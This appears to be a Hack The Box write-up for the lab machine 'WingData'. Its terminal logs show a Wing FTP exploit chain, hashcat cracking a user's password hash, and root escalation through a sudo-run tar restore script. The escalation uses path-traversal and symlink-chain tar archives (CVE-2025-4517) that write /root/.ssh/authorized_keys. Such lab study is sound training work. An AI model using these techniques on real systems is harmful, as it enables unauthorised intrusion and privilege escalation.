---
MOC:
tags:
  - "#writeup"
URL:
Category:
socialImage: "[[WingData.png]]"
socialDescription: HTB WingData Writeup
---
-- --
![[WingData.png]]
# Attack Path

- Get website user with this [PoC](https://www.exploit-db.com/exploits/52347)
	- The code needs to be changed to `command = quote(command)` for easier reverse shell
- Get user
	- Find hashed password in `/opt/wftpserver/Data/1/users/wacky.xml`
	- Crack the hash with information in `/opt/wftpserver/Data/1/settings.xml`
- Get root with this [PoC](https://github.com/0xDTC/CVE-2025-4517-tarfile-PATH_MAX-bypass)
	- `DEPTH_TO_ROOT` is 4, not 3



```shell
┌──(kali㉿kali)-[~/Downloads]
└─$ cat hash.txt                                                    
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP
a8339f8e4465a9c47158394d8efe7cc45a5f361ab983844c8562bef2193bafba:WingFTP
                                                                                                                                                                                      
┌──(kali㉿kali)-[~/Downloads]
└─$ hashcat -m 1410 -a 0 hash.txt /usr/share/wordlists/rockyou.txt 
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #01: cpu--0x000, 1466/2932 MB (512 MB allocatable), 10MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory allocated for this attack: 514 MB (992 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

Approaching final keyspace - workload adjusted.           

32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1410 (sha256($pass.$salt))
Hash.Target......: hash.txt
Time.Started.....: Thu Apr  2 20:53:07 2026 (2 secs)
Time.Estimated...: Thu Apr  2 20:53:09 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  5866.0 kH/s (0.56ms) @ Accel:1024 Loops:1 Thr:1 Vec:4
Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new)
Progress.........: 14344384/14344384 (100.00%)
Rejected.........: 0/14344384 (0.00%)
Restore.Point....: 14344384/14344384 (100.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: #!goth -> $HEX[042a0337c2a156616d6f732103]

Started: Thu Apr  2 20:52:56 2026
Stopped: Thu Apr  2 20:53:10 2026
```


```
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh wacky@wingdata.htb -L 9000:localhost:5466
wacky@wingdata.htb's password: 
Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Apr 2 20:59:36 2026 from 10.10.14.233
wacky@wingdata:~$ ls
user.txt
wacky@wingdata:~$ cd /opt
wacky@wingdata:/opt$ ls
backup_clients  wftpserver
wacky@wingdata:/opt$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
wacky@wingdata:/opt$ cat /opt/backup_clients/restore_backup_clients.py 
#!/usr/bin/env python3
import tarfile
import os
import sys
import re
import argparse

BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"

def validate_backup_name(filename):
    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
        return False
    client_id = filename.split('_')[1].rstrip('.tar')
    return client_id.isdigit() and client_id != "0"

def validate_restore_tag(tag):
    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))

def main():
    parser = argparse.ArgumentParser(
        description="Restore client configuration from a validated backup tarball.",
        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
    )
    parser.add_argument(
        "-b", "--backup",
        required=True,
        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar, "
             "where <client_id> is a positive integer, e.g., backup_1001.tar)"
    )
    parser.add_argument(
        "-r", "--restore-dir",
        required=True,
        help="Staging directory name for the restore operation. "
             "Must follow the format: restore_<client_user> (e.g., restore_john). "
             "Only alphanumeric characters and underscores are allowed in the <client_user> part (1–24 characters)."
    )

    args = parser.parse_args()

    if not validate_backup_name(args.backup):
        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar (e.g., backup_1001.tar)", file=sys.stderr)
        sys.exit(1)

    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
    if not os.path.isfile(backup_path):
        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
        sys.exit(1)

    if not args.restore_dir.startswith("restore_"):
        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
        sys.exit(1)

    tag = args.restore_dir[8:]
    if not tag:
        print("[!] --restore-dir must include a non-empty tag after 'restore_'", file=sys.stderr)
        sys.exit(1)

    if not validate_restore_tag(tag):
        print("[!] Restore tag must be 1–24 characters long and contain only letters, digits, or underscores", file=sys.stderr)
        sys.exit(1)

    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
    print(f"[+] Backup: {args.backup}")
    print(f"[+] Staging directory: {staging_dir}")

    os.makedirs(staging_dir, exist_ok=True)

    try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
        print(f"[+] Extraction completed in {staging_dir}")
    except (tarfile.TarError, OSError, Exception) as e:
        print(f"[!] Error during extraction: {e}", file=sys.stderr)
        sys.exit(2)

if __name__ == "__main__":
    main()
wacky@wingdata:/opt$ ls -la backup_clients/
total 20
drwxr-x--- 4 root wacky 4096 Jan 12 08:43 .
drwxr-xr-x 4 root root  4096 Feb  9 08:19 ..
drwxrwx--- 2 root wacky 4096 Apr  2 21:11 backups
-rwxr-x--- 1 root wacky 2829 Jan 12 08:37 restore_backup_clients.py
drwxr-x--- 2 root wacky 4096 Jan 12 08:43 restored_backups
wacky@wingdata:/opt$ nano check.py
wacky@wingdata:/opt$ cd backup_clients/
wacky@wingdata:/opt/backup_clients$ cd backups/
wacky@wingdata:/opt/backup_clients/backups$ ls
backup.py
wacky@wingdata:/opt/backup_clients/backups$ nano check.py
wacky@wingdata:/opt/backup_clients/backups$ python3 check.py 
[*] Checking sudo -l for restore_backup_clients.py ...
[+] Found expected sudo rule for restore_backup_clients.py
[*] Checking script path and contents ...
[+] Script uses tarfile.open(..., 'r') and extractall(...)
[*] Creating simple traversal test tar at /opt/backup_clients/backups/backup_9999.tar ...
Traceback (most recent call last):
  File "/opt/backup_clients/backups/check.py", line 125, in <module>
    main()
  File "/opt/backup_clients/backups/check.py", line 120, in main
    make_simple_traversal_tar()
  File "/opt/backup_clients/backups/check.py", line 74, in make_simple_traversal_tar
    tar.addfile(info, fileobj=io.BytesIO(data))
                              ^^
NameError: name 'io' is not defined. Did you mean: 'id'? Or did you forget to import 'io'?
wacky@wingdata:/opt/backup_clients/backups$ nano check.py
wacky@wingdata:/opt/backup_clients/backups$ python3 check.py 
[*] Checking sudo -l for restore_backup_clients.py ...
[+] Found expected sudo rule for restore_backup_clients.py
[*] Checking script path and contents ...
[+] Script uses tarfile.open(..., 'r') and extractall(...)
[*] Creating simple traversal test tar at /opt/backup_clients/backups/backup_9999.tar ...
[+] Created basic traversal tar
[*] Cleaning old test target if any ...
[*] Running restore_backup_clients.py via sudo ...
[*] Script output:
[+] Backup: backup_9999.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_wacky_test

[*] Checking for escaped file: /tmp/restore_test.txt
[+] /tmp/restore_test.txt does NOT exist.
    Simple traversal payload was blocked by tarfile filter.
    Any real exploit would need a more advanced technique (e.g.
    PATH_MAX/symlink-chain bug as described in recent tarfile advisories).
wacky@wingdata:/opt/backup_clients/backups$ rm backup.py
wacky@wingdata:/opt/backup_clients/backups$ nano exploit.py
wacky@wingdata:/opt/backup_clients/backups$ python3 exploit.py 
[+] Creating malicious tar: backup_1001.tar
Traceback (most recent call last):
  File "/opt/backup_clients/backups/exploit.py", line 62, in <module>
    main()
  File "/opt/backup_clients/backups/exploit.py", line 48, in main
    tar.addfile(info, fileobj=os.BytesIO(PAYLOAD))
                              ^^^^^^^^^^
AttributeError: module 'os' has no attribute 'BytesIO'
wacky@wingdata:/opt/backup_clients/backups$ nano exploit.py
wacky@wingdata:/opt/backup_clients/backups$ python3 exploit.py 
[+] Creating malicious tar: backup_1001.tar
[+] Created backup_1001.tar with member name: ../../../../../../tmp/rootshell
[*] Next steps (on the target box, as wacky):
    1) Copy the tar into /opt/backup_clients/backups/:
       cp backup_1001.tar /opt/backup_clients/backups/
    2) Run the vulnerable restore script as root:
       sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1001.tar -r restore_pwn
    3) If it worked, on the box you should see /tmp/rootshell as root-owned.
       Then run: /tmp/rootshell
       and you should get a root shell (bash -p).
wacky@wingdata:/opt/backup_clients/backups$ ls
backup_1001.tar  backup_9999.tar  check.py  exploit.py
wacky@wingdata:/opt/backup_clients/backups$ sudo python3 ../restore_backup_clients.py -b backup_1001.tar -r restore_pwn
[sudo] password for wacky: 
sudo: a password is required
wacky@wingdata:/opt/backup_clients/backups$ sudo -u root python3 ../restore_backup_clients.py -b backup_1001.tar -r restore_pwn
[sudo] password for wacky: 
sudo: a password is required
wacky@wingdata:/opt/backup_clients/backups$ sudo -u root /usr/local/bin/python3 ../restore_backup_clients.py -b backup_1001.tar -r restore_pwn
[sudo] password for wacky: 
sudo: a password is required
wacky@wingdata:/opt/backup_clients/backups$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
wacky@wingdata:/opt/backup_clients/backups$ sudo -u root /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1001.tar -r restore_pwn
[+] Backup: backup_1001.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwn
[!] Error during extraction: '../../../../../../tmp/rootshell' would be extracted to '/tmp/rootshell', which is outside the destination
wacky@wingdata:/opt/backup_clients/backups$ nano exploit.py
wacky@wingdata:/opt/backup_clients/backups$ python3 exploit.py 
[+] Creating malicious tar: backup_1001.tar
[+] Created backup_1001.tar with member name: ../../../../../../../../../../../../../../../../../../tmp/rootshell
[*] Next steps (on the target box, as wacky):
    1) Copy the tar into /opt/backup_clients/backups/:
       cp backup_1001.tar /opt/backup_clients/backups/
    2) Run the vulnerable restore script as root:
       sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1001.tar -r restore_pwn
    3) If it worked, on the box you should see /tmp/rootshell as root-owned.
       Then run: /tmp/rootshell
       and you should get a root shell (bash -p).
wacky@wingdata:/opt/backup_clients/backups$ sudo -u root /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1001.tar -r restore_pwn
[+] Backup: backup_1001.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwn
[!] Error during extraction: '../../../../../../../../../../../../../../../../../../tmp/rootshell' would be extracted to '/tmp/rootshell', which is outside the destination
wacky@wingdata:/opt/backup_clients/backups$ python3 -v
import _frozen_importlib # frozen
import _imp # builtin
import '_thread' # <class '_frozen_importlib.BuiltinImporter'>
import '_warnings' # <class '_frozen_importlib.BuiltinImporter'>
import '_weakref' # <class '_frozen_importlib.BuiltinImporter'>
import '_io' # <class '_frozen_importlib.BuiltinImporter'>
import 'marshal' # <class '_frozen_importlib.BuiltinImporter'>
import 'posix' # <class '_frozen_importlib.BuiltinImporter'>
import '_frozen_importlib_external' # <class '_frozen_importlib.FrozenImporter'>
# installing zipimport hook
import 'time' # <class '_frozen_importlib.BuiltinImporter'>
import 'zipimport' # <class '_frozen_importlib.FrozenImporter'>
# installed zipimport hook
# /usr/local/lib/python3.12/encodings/__pycache__/__init__.cpython-312.pyc matches /usr/local/lib/python3.12/encodings/__init__.py
# code object from '/usr/local/lib/python3.12/encodings/__pycache__/__init__.cpython-312.pyc'
import '_codecs' # <class '_frozen_importlib.BuiltinImporter'>
import 'codecs' # <class '_frozen_importlib.FrozenImporter'>
# /usr/local/lib/python3.12/encodings/__pycache__/aliases.cpython-312.pyc matches /usr/local/lib/python3.12/encodings/aliases.py
# code object from '/usr/local/lib/python3.12/encodings/__pycache__/aliases.cpython-312.pyc'
import 'encodings.aliases' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fc0944a0>
import 'encodings' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fc05faa0>
# /usr/local/lib/python3.12/encodings/__pycache__/utf_8.cpython-312.pyc matches /usr/local/lib/python3.12/encodings/utf_8.py
# code object from '/usr/local/lib/python3.12/encodings/__pycache__/utf_8.cpython-312.pyc'
import 'encodings.utf_8' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fc096a20>
import '_signal' # <class '_frozen_importlib.BuiltinImporter'>
import '_abc' # <class '_frozen_importlib.BuiltinImporter'>
import 'abc' # <class '_frozen_importlib.FrozenImporter'>
import 'io' # <class '_frozen_importlib.FrozenImporter'>
import '_stat' # <class '_frozen_importlib.BuiltinImporter'>
import 'stat' # <class '_frozen_importlib.FrozenImporter'>
import '_collections_abc' # <class '_frozen_importlib.FrozenImporter'>
import 'genericpath' # <class '_frozen_importlib.FrozenImporter'>
import 'posixpath' # <class '_frozen_importlib.FrozenImporter'>
import 'os' # <class '_frozen_importlib.FrozenImporter'>
import '_sitebuiltins' # <class '_frozen_importlib.FrozenImporter'>
Processing user site-packages
Processing global site-packages
Adding directory: '/usr/local/lib/python3.12/site-packages'
import 'site' # <class '_frozen_importlib.FrozenImporter'>
# extension module 'readline' loaded from '/usr/local/lib/python3.12/lib-dynload/readline.cpython-312-x86_64-linux-gnu.so'
# extension module 'readline' executed from '/usr/local/lib/python3.12/lib-dynload/readline.cpython-312-x86_64-linux-gnu.so'
import 'readline' # <_frozen_importlib_external.ExtensionFileLoader object at 0x7f77fbb010d0>
# /usr/local/lib/python3.12/__pycache__/rlcompleter.cpython-312.pyc matches /usr/local/lib/python3.12/rlcompleter.py
# code object from '/usr/local/lib/python3.12/__pycache__/rlcompleter.cpython-312.pyc'
import 'atexit' # <class '_frozen_importlib.BuiltinImporter'>
# /usr/local/lib/python3.12/__pycache__/inspect.cpython-312.pyc matches /usr/local/lib/python3.12/inspect.py
# code object from '/usr/local/lib/python3.12/__pycache__/inspect.cpython-312.pyc'
# /usr/local/lib/python3.12/__pycache__/ast.cpython-312.pyc matches /usr/local/lib/python3.12/ast.py
# code object from '/usr/local/lib/python3.12/__pycache__/ast.cpython-312.pyc'
# /usr/local/lib/python3.12/re/__pycache__/__init__.cpython-312.pyc matches /usr/local/lib/python3.12/re/__init__.py
# code object from '/usr/local/lib/python3.12/re/__pycache__/__init__.cpython-312.pyc'
# /usr/local/lib/python3.12/__pycache__/enum.cpython-312.pyc matches /usr/local/lib/python3.12/enum.py
# code object from '/usr/local/lib/python3.12/__pycache__/enum.cpython-312.pyc'
# /usr/local/lib/python3.12/__pycache__/types.cpython-312.pyc matches /usr/local/lib/python3.12/types.py
# code object from '/usr/local/lib/python3.12/__pycache__/types.cpython-312.pyc'
import 'types' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb6f980>
# /usr/local/lib/python3.12/__pycache__/operator.cpython-312.pyc matches /usr/local/lib/python3.12/operator.py
# code object from '/usr/local/lib/python3.12/__pycache__/operator.cpython-312.pyc'
import '_operator' # <class '_frozen_importlib.BuiltinImporter'>
import 'operator' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb6fbf0>
# /usr/local/lib/python3.12/__pycache__/functools.cpython-312.pyc matches /usr/local/lib/python3.12/functools.py
# code object from '/usr/local/lib/python3.12/__pycache__/functools.cpython-312.pyc'
# /usr/local/lib/python3.12/collections/__pycache__/__init__.cpython-312.pyc matches /usr/local/lib/python3.12/collections/__init__.py
# code object from '/usr/local/lib/python3.12/collections/__pycache__/__init__.cpython-312.pyc'
import 'itertools' # <class '_frozen_importlib.BuiltinImporter'>
# /usr/local/lib/python3.12/__pycache__/keyword.cpython-312.pyc matches /usr/local/lib/python3.12/keyword.py
# code object from '/usr/local/lib/python3.12/__pycache__/keyword.cpython-312.pyc'
import 'keyword' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb9f680>
# /usr/local/lib/python3.12/__pycache__/reprlib.cpython-312.pyc matches /usr/local/lib/python3.12/reprlib.py
# code object from '/usr/local/lib/python3.12/__pycache__/reprlib.cpython-312.pyc'
import 'reprlib' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb9f950>
import '_collections' # <class '_frozen_importlib.BuiltinImporter'>
import 'collections' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb834a0>
import '_functools' # <class '_frozen_importlib.BuiltinImporter'>
import 'functools' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb80bc0>
import 'enum' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb6cd40>
# /usr/local/lib/python3.12/re/__pycache__/_compiler.cpython-312.pyc matches /usr/local/lib/python3.12/re/_compiler.py
# code object from '/usr/local/lib/python3.12/re/__pycache__/_compiler.cpython-312.pyc'
import '_sre' # <class '_frozen_importlib.BuiltinImporter'>
# /usr/local/lib/python3.12/re/__pycache__/_parser.cpython-312.pyc matches /usr/local/lib/python3.12/re/_parser.py
# code object from '/usr/local/lib/python3.12/re/__pycache__/_parser.cpython-312.pyc'
# /usr/local/lib/python3.12/re/__pycache__/_constants.cpython-312.pyc matches /usr/local/lib/python3.12/re/_constants.py
# code object from '/usr/local/lib/python3.12/re/__pycache__/_constants.cpython-312.pyc'
import 're._constants' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbbc2e70>
import 're._parser' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbbc1ac0>
# /usr/local/lib/python3.12/re/__pycache__/_casefix.cpython-312.pyc matches /usr/local/lib/python3.12/re/_casefix.py
# code object from '/usr/local/lib/python3.12/re/__pycache__/_casefix.cpython-312.pyc'
import 're._casefix' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbbc2ed0>
import 're._compiler' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb81c10>
# /usr/local/lib/python3.12/__pycache__/copyreg.cpython-312.pyc matches /usr/local/lib/python3.12/copyreg.py
# code object from '/usr/local/lib/python3.12/__pycache__/copyreg.cpython-312.pyc'
import 'copyreg' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbbfc170>
import 're' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb4bf80>
import '_ast' # <class '_frozen_importlib.BuiltinImporter'>
# /usr/local/lib/python3.12/__pycache__/contextlib.cpython-312.pyc matches /usr/local/lib/python3.12/contextlib.py
# code object from '/usr/local/lib/python3.12/__pycache__/contextlib.cpython-312.pyc'
import 'contextlib' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbbfff80>
import 'ast' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb3e7e0>
# /usr/local/lib/python3.12/__pycache__/dis.cpython-312.pyc matches /usr/local/lib/python3.12/dis.py
# code object from '/usr/local/lib/python3.12/__pycache__/dis.cpython-312.pyc'
# /usr/local/lib/python3.12/__pycache__/opcode.cpython-312.pyc matches /usr/local/lib/python3.12/opcode.py
# code object from '/usr/local/lib/python3.12/__pycache__/opcode.cpython-312.pyc'
# extension module '_opcode' loaded from '/usr/local/lib/python3.12/lib-dynload/_opcode.cpython-312-x86_64-linux-gnu.so'
# extension module '_opcode' executed from '/usr/local/lib/python3.12/lib-dynload/_opcode.cpython-312-x86_64-linux-gnu.so'
import '_opcode' # <_frozen_importlib_external.ExtensionFileLoader object at 0x7f77fb9f81d0>
import 'opcode' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fb9bf560>
import 'dis' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb3fa40>
# /usr/local/lib/python3.12/collections/__pycache__/abc.cpython-312.pyc matches /usr/local/lib/python3.12/collections/abc.py
# code object from '/usr/local/lib/python3.12/collections/__pycache__/abc.cpython-312.pyc'
import 'collections.abc' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fb9f9a30>
# /usr/local/lib/python3.12/importlib/__pycache__/__init__.cpython-312.pyc matches /usr/local/lib/python3.12/importlib/__init__.py
# code object from '/usr/local/lib/python3.12/importlib/__pycache__/__init__.cpython-312.pyc'
# /usr/local/lib/python3.12/__pycache__/warnings.cpython-312.pyc matches /usr/local/lib/python3.12/warnings.py
# code object from '/usr/local/lib/python3.12/__pycache__/warnings.cpython-312.pyc'
import 'warnings' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fb9f94f0>
import 'importlib' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fb9f9880>
import 'importlib.machinery' # <class '_frozen_importlib.FrozenImporter'>
# /usr/local/lib/python3.12/__pycache__/linecache.cpython-312.pyc matches /usr/local/lib/python3.12/linecache.py
# code object from '/usr/local/lib/python3.12/__pycache__/linecache.cpython-312.pyc'
# /usr/local/lib/python3.12/__pycache__/tokenize.cpython-312.pyc matches /usr/local/lib/python3.12/tokenize.py
# code object from '/usr/local/lib/python3.12/__pycache__/tokenize.cpython-312.pyc'
# /usr/local/lib/python3.12/__pycache__/token.cpython-312.pyc matches /usr/local/lib/python3.12/token.py
# code object from '/usr/local/lib/python3.12/__pycache__/token.cpython-312.pyc'
import 'token' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fba10e60>
import '_tokenize' # <class '_frozen_importlib.BuiltinImporter'>
import 'tokenize' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fb9fb9b0>
import 'linecache' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fb9fb740>
import 'inspect' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb01820>
import 'rlcompleter' # <_frozen_importlib_external.SourceFileLoader object at 0x7f77fbb01280>
Python 3.12.3 (main, Nov  3 2025, 09:30:32) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> exit()
# clear sys.path_importer_cache
# clear sys.path_hooks
# clear builtins._
# clear sys.path
# clear sys.argv
# clear sys.ps1
# clear sys.ps2
# clear sys.last_exc
# clear sys.last_type
# clear sys.last_value
# clear sys.last_traceback
# clear sys.__interactivehook__
# clear sys.meta_path
# restore sys.stdin
# restore sys.stdout
# restore sys.stderr
# cleanup[2] removing sys
# cleanup[2] removing builtins
# cleanup[2] removing _frozen_importlib
# cleanup[2] removing _imp
# cleanup[2] removing _thread
# cleanup[2] removing _warnings
# cleanup[2] removing _weakref
# cleanup[2] removing _io
# cleanup[2] removing marshal
# cleanup[2] removing posix
# cleanup[2] removing _frozen_importlib_external
# cleanup[2] removing time
# cleanup[2] removing zipimport
# destroy zipimport
# cleanup[2] removing _codecs
# cleanup[2] removing codecs
# cleanup[2] removing encodings.aliases
# cleanup[2] removing encodings
# destroy encodings
# cleanup[2] removing encodings.utf_8
# cleanup[2] removing _signal
# cleanup[2] removing _abc
# cleanup[2] removing abc
# cleanup[2] removing io
# cleanup[2] removing __main__
# cleanup[2] removing _stat
# cleanup[2] removing stat
# cleanup[2] removing _collections_abc
# cleanup[2] removing genericpath
# cleanup[2] removing posixpath
# cleanup[2] removing os.path
# cleanup[2] removing os
# cleanup[2] removing _sitebuiltins
# cleanup[2] removing site
# destroy site
# cleanup[2] removing readline
# cleanup[2] removing atexit
# cleanup[2] removing types
# cleanup[2] removing _operator
# cleanup[2] removing operator
# destroy operator
# cleanup[2] removing itertools
# cleanup[2] removing keyword
# cleanup[2] removing reprlib
# destroy reprlib
# cleanup[2] removing _collections
# cleanup[2] removing collections
# cleanup[2] removing _functools
# cleanup[2] removing functools
# cleanup[2] removing enum
# cleanup[2] removing _sre
# cleanup[2] removing re._constants
# cleanup[2] removing re._parser
# cleanup[2] removing re._casefix
# cleanup[2] removing re._compiler
# cleanup[2] removing copyreg
# cleanup[2] removing re
# cleanup[2] removing _ast
# destroy _ast
# cleanup[2] removing contextlib
# destroy contextlib
# cleanup[2] removing ast
# cleanup[2] removing _opcode
# cleanup[2] removing opcode
# destroy opcode
# cleanup[2] removing dis
# cleanup[2] removing collections.abc
# cleanup[2] removing importlib._bootstrap
# cleanup[2] removing importlib._bootstrap_external
# cleanup[2] removing warnings
# cleanup[2] removing importlib
# cleanup[2] removing importlib.machinery
# cleanup[2] removing token
# cleanup[2] removing _tokenize
# cleanup[2] removing tokenize
# cleanup[2] removing linecache
# cleanup[2] removing inspect
# cleanup[2] removing rlcompleter
# destroy rlcompleter
# destroy time
# destroy _signal
# destroy _sitebuiltins
# destroy inspect
# destroy keyword
# destroy __main__
# destroy atexit
# destroy ast
# destroy dis
# destroy importlib
# destroy linecache
# destroy token
# destroy types
# destroy io
# destroy _opcode
# destroy warnings
# destroy importlib.machinery
# destroy tokenize
# destroy collections
# destroy _tokenize
# cleanup[3] wiping importlib._bootstrap_external
# cleanup[3] wiping importlib._bootstrap
# destroy _frozen_importlib_external
# cleanup[3] wiping collections.abc
# cleanup[3] wiping re
# destroy re._constants
# destroy re._casefix
# destroy re._compiler
# destroy enum
# destroy functools
# destroy copyreg
# cleanup[3] wiping re._parser
# cleanup[3] wiping _sre
# cleanup[3] wiping _functools
# cleanup[3] wiping _collections
# cleanup[3] wiping itertools
# cleanup[3] wiping _operator
# cleanup[3] wiping readline
# cleanup[3] wiping os
# destroy posixpath
# cleanup[3] wiping genericpath
# cleanup[3] wiping _collections_abc
# cleanup[3] wiping stat
# cleanup[3] wiping _stat
# destroy _stat
# cleanup[3] wiping abc
# cleanup[3] wiping _abc
# cleanup[3] wiping encodings.utf_8
# cleanup[3] wiping encodings.aliases
# cleanup[3] wiping codecs
# cleanup[3] wiping _codecs
# cleanup[3] wiping posix
# cleanup[3] wiping marshal
# destroy marshal
# cleanup[3] wiping _io
# cleanup[3] wiping _weakref
# cleanup[3] wiping _warnings
# destroy _warnings
# cleanup[3] wiping _thread
# cleanup[3] wiping _imp
# destroy _imp
# cleanup[3] wiping _frozen_importlib
# cleanup[3] wiping sys
# cleanup[3] wiping builtins
# destroy readline
# destroy sys.monitoring
# destroy _io
# destroy re._parser
# destroy stat
# destroy genericpath
# destroy posix
# clear sys.meta_path
# clear sys.modules
# destroy _frozen_importlib
# destroy codecs
# destroy encodings.aliases
# destroy encodings.utf_8
# destroy _codecs
# destroy re
# destroy abc
# destroy os
# destroy _sre
# destroy _abc
# destroy _collections_abc
# destroy sys
# destroy _operator
# destroy _weakref
# destroy _collections
# destroy collections.abc
# destroy builtins
# destroy itertools
# destroy _functools
# destroy _thread
# clear sys.audit hooks
wacky@wingdata:/opt/backup_clients/backups$ python3 --version
Python 3.12.3
wacky@wingdata:/opt/backup_clients/backups$ rm exploit.py 
wacky@wingdata:/opt/backup_clients/backups$ nano exploit.py
wacky@wingdata:/opt/backup_clients/backups$ python3 exploit.py
[*] Destination directory length: 28
[*] Component length: 239
[*] Estimated resolved path length: 4108
[*] PATH_MAX: 4096

[+] Created 16 directory/symlink pairs
[+] Created 254-char escaping symlink (target: ../../../../../../../../../../../../../../../../)
[+] Created 'escape' symlink (depth to root: 3)
[+] Added payload file: escape/root/.ssh/authorized_keys

[*] Created backup_1001.tar
[*] Target file on extraction: /root/.ssh/authorized_keys

[!] Transfer this tar to the target and trigger extraction
[!] via the vulnerable Python script using filter='data'
wacky@wingdata:/opt/backup_clients/backups$ ls
backup_1001.tar  backup_9999.tar  check.py  exploit.py
wacky@wingdata:/opt/backup_clients/backups$ sudo -u root /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1001.tar -r restore_pwn
[+] Backup: backup_1001.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_pwn
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_pwn
wacky@wingdata:/opt/backup_clients/backups$ ls /opt
backup_clients  root  wftpserver
wacky@wingdata:/opt/backup_clients/backups$ nano exploit.py
wacky@wingdata:/opt/backup_clients/backups$ python3 exploit.py 
[*] Destination directory length: 28
[*] Component length: 239
[*] Estimated resolved path length: 4108
[*] PATH_MAX: 4096

[+] Created 16 directory/symlink pairs
[+] Created 254-char escaping symlink (target: ../../../../../../../../../../../../../../../../)
[+] Created 'escape' symlink (depth to root: 4)
